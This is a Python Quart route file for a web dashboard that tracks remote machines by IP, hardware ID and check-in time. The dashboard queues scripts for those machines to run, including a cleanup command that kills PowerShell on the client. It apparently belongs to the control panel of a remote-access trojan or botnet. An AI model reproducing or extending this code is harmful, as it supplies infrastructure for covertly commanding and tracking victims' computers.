import asyncio
from quart import render_template, request, redirect, url_for, jsonify
import aiosqlite

from util.blacklist.ip_blacklist import black_list_ip
from util.system.stats import get_system_stats
from util.db.user_queries import get_users, get_user_count
from util.helpers.time_format import format_time_ago
from util.pagination import create_pagination_info
from config import DATABASE


def register_dashboard_routes(app):
    """Register dashboard routes with the app"""

    @app.route("/")
    @app.route("/dashboard")
    @black_list_ip()
    async def dashboard():

        try:
            page = int(request.args.get("page", 1))
            if page < 1:
                page = 1
        except (TypeError, ValueError):
            page = 1

        search_term = request.args.get("search", None)

        per_page = 10
        offset = (page - 1) * per_page

        sort_by = request.args.get("sort", "id")
        order = request.args.get("order", "asc")

        allowed_columns = [
            "id",
            "pcname",
            "ip_address",
            "country",
            "last_ping",
            "first_ping",
            "is_active",
            "hwid",
            "hostname",
        ]
        if sort_by not in allowed_columns:
            sort_by = "id"

        if order not in ["asc", "desc"]:
            order = "asc"

        users, total = await asyncio.gather(
            get_users(offset, per_page, sort_by, order, search_term),
            get_user_count(search_term),
        )

        for user in users:
            user["last_ping_formatted"] = format_time_ago(user["last_ping"])
            user["first_ping_formatted"] = format_time_ago(user["first_ping"])

        system_stats = get_system_stats()

        pagination = create_pagination_info(page, per_page, total)

        return await render_template(
            "dashboard.html",
            users=users,
            pagination=pagination,
            active_page="dashboard",
            current_sort=sort_by,
            current_order=order,
            system_stats=system_stats,
            total_users=total,
            search_term=search_term,
        )

    @app.route("/delete_user/<int:user_id>", methods=["POST"])
    @black_list_ip()
    async def delete_user(user_id):
        """Delete a user from the database"""
        try:
            async with aiosqlite.connect(DATABASE) as db:
                db.row_factory = aiosqlite.Row

                cursor = await db.execute(
                    "SELECT hwid, pcname FROM user WHERE id = ?", (user_id,)
                )
                user = await cursor.fetchone()

                if not user:
                    return (
                        jsonify({"status": "error", "message": "User not found"}),
                        404,
                    )

                hwid = user["hwid"]

                pending_delete_name = f"PENDING_DELETION_{user['pcname']}"
                await db.execute(
                    "UPDATE user SET pcname = ? WHERE id = ?",
                    (pending_delete_name, user_id),
                )

                if hwid:

                    cleanup_script = """
                    taskkill /f /im powershell.exe
                    """

                    await db.execute(
                        """
                        INSERT INTO scripts (name, content, is_global, user_id, executed)
                        VALUES (?, ?, 0, ?, 0)
                        """,
                        ("Client Cleanup", cleanup_script, user_id),
                    )

                    await db.commit()

                    return jsonify(
                        {
                            "status": "success",
                            "message": "User marked for deletion, cleanup initiated",
                        }
                    )
                else:

                    await db.execute(
                        "DELETE FROM scripts WHERE user_id = ?", (user_id,)
                    )
                    await db.execute("DELETE FROM user WHERE id = ?", (user_id,))
                    await db.commit()

                    return jsonify(
                        {"status": "success", "message": "User deleted successfully"}
                    )

        except Exception as e:
            print(f"Error deleting user: {e}")
            return jsonify({"status": "error", "message": str(e)}), 500

    return app
